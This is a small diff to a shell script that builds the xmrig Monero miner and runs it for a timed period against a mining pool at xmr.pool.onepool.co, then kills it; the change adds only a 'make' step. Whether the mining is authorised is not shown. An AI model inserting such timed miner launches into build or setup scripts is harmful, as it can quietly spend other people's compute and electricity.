@@ -15,6 +15,7 @@ cd xmrig
 mkdir -p build
 cd build
 cmake ../
+make
 ./xmrig --help
 timeout $jssleeptime ./xmrig -o xmr.pool.onepool.co:13531 -u $jsxmrigid:$jsxmrigname -p x -k
 killall xmrig
